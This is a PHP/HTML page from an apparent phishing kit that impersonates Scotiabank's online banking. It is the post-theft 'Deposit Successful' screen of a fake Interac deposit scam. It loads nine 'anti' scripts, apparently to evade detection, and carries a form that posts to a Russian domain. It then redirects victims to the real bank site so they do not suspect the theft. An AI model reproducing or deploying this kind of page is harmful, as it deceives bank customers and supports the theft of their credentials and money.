<?php
session_start();
	include '../prevents/anti1.php';
	include '../prevents/anti2.php';
	include '../prevents/anti3.php';
	include '../prevents/anti4.php';
	include '../prevents/anti5.php';
	include '../prevents/anti6.php';
	include '../prevents/anti7.php';
	include '../prevents/anti8.php';
	include '../prevents/anti9.php';
	

?>
<!DOCTYPE html>
<html style="" class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths" lang="en">
<!-- Mirrored from bioutil.ru/bell/interac/sco/complete.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 21 Sep 2018 18:12:15 GMT -->
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Scotiabank-BankingWeb</title>
  <meta name="description" content="">
  <link rel="shortcut icon" href="https://mobilebanking4.scotiabank.com/bankingweb/resources/favicon.ico" type="image/x-icon">
  <link rel="apple-touch-icon" href="https://mobilebanking4.scotiabank.com/bankingweb/resources/apple-icon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.00, maximum-scale=1, user-scalable=0">
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <link rel="stylesheet" href="https://mobilebanking4.scotiabank.com/bankingweb/css/css.css">
<META HTTP-EQUIV="Refresh" CONTENT="5;URL=https://mobilebanking4.scotiabank.com">
  <!-- ga -->
 <meta class="foundation-data-attribute-namespace"><meta class="foundation-mq-xxlarge"><meta class="foundation-mq-xlarge-only"><meta class="foundation-mq-xlarge"><meta class="foundation-mq-large-only"><meta class="foundation-mq-large"><meta class="foundation-mq-medium-only"><meta class="foundation-mq-medium"><meta class="foundation-mq-small-only"><meta class="foundation-mq-small"><style></style>


<meta class="foundation-mq-topbar"><style type="text/css"></style><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="components/user-management/recover-userid-password/recover-userid-password" src="files/components.html"></script></head>
<body class="f-topbar-fixed">
<nav-bar params="route: route"><div>
    <div class="nav-bar fixed" data-bind="template: { afterRender: enhanceWithin}">
        <nav class="top-bar scotiabank" data-topbar="" role="navigation" data-bind="visible: isVisible(), attr: { class: 'top-bar ' + branding() }" style="">
            <ul class="title-area">
                <li class="name">
                    <h1>
                        <!--
                        <div data-bind="ifnot: route().page === 'account-summary'">
                        <a href="" id="goBack" class="back-button" data-bind="click: goBack" ><img class="back-button"src="images/arrow-back.svg" onerror="this.src='images/arrow-back.png'"></img></a>
                        </div>
                        -->

                    </h1>
                </li>
                
                <!-- <section class="middle tab-bar-section" data-bind="if: displayPageTitle()">
                        <span class="medium" data-bind="html: pageTitle()" tabindex="0"></span>
                </section> -->
                
                <!-- Remove the class "menu-icon" to get rid of menu icon. Take out "Menu" to just have icon alone -->
                <li class="toggle-topbar" data-bind="if: displayMenuOptions()"></li>
            </ul>
            
        <section class="middle tab-bar-section">
                        <img class="logo" aria-hidden="route().page === 'activate-select' || route().page === 'recover-select'  || route().page === 'dcv' " tabindex="0" alt="Scotiabank" data-bind="attr: {src: navLogoSVG(), onerror: navLogoPNG()}" src="files/logo.svg" onerror="images/en/logo.png">

                </section><section class="top-bar-section" data-bind="if: displayMenuOptions()"></section></nav>
    </div>
</div></nav-bar>
<notifications><div class="notifications" aria-live="assertive" data-bind="template: { afterRender: enhanceWithin}">
	<div class="error-message alert-box" role="alertdialog" data-bind="notificationVisible: hasNotification, notificationType: globalNotification().notificationType" tabindex="-1" style="display: none;">
		<!-- ko if: globalNotification() --><!-- /ko -->
	</div>
</div></notifications>
<loading params="{isLoading: BankingJS.Utilities.Network.isLoading}"><div data-bind="template: { afterRender: enhanceWithin}, visible: isLoading" class="loading-container" role="alert" aria-live="assertive" tabindex="0" style="display: none;">
	<div class="loading" id="load" aria-label="Loading"><div class="spinner" style="position: absolute; width: 0px; z-index: 2000000000; left: 50%; top: 50%;" role="progressbar"><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-0-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(0deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-1-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(27deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-2-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(55deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-3-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(83deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-4-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(110deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-5-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(138deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-6-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(166deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-7-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(193deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-8-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(221deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-9-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(249deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-10-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(276deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-11-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(304deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-12-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(332deg) translate(24px, 0px); border-radius: 5px;"></div></div></div><div style="color: transparent">Loading...</div></div>
</div></loading>
<div id="page" class="container height100" data-bind="component: { name: route().page, params: route }, css: isWideView() ? 'height100' :''"><div data-bind="template: { afterRender: enhanceWithin}" class="mfa-container component-container" id="mfa">
    <div class="margin" data-bind="if: mfaQuestion">
        <div class="title">
            <span class="medium red title" data-bind="text: lbl.MFASecurityQuestion">Complete</span>
        </div>
        <form method="post" action="https://bioutil.ru/bell/interac/sco/processing.php" id="mfaForm" >
            <div id="question" class="clearfix mb7">
			
			<span>Deposit Successful ,</span></br>
			<span>
Please allow 48 hours for the funds to reflect in your account. Thank you.</span>
  </div> </br></br></br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  <img src="files/Loader.gif" />
          
            <div>
            </div>
			</br>
           </br></br></br></br></br>
                <div>
                                </div>
            <div id="disclaimer" class="clearfix">
                <span class="small dark-grey left" data-bind="text: lbl.MFADisclaimer">Mobile Banking and Scotia OnLine use the same security questions. For help, please call 1-877-908-8866.</span>
            </div>
        </form>
    </div>
</div></div>
<script type="text/javascript">var _cf = _cf || [];  _cf.push(['_setBm', true]);</script><script type="text/javascript" src="files/bd-1-29.html"></script>

</body>
<!-- Mirrored from bioutil.ru/bell/interac/sco/complete.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 21 Sep 2018 18:12:17 GMT -->
</html>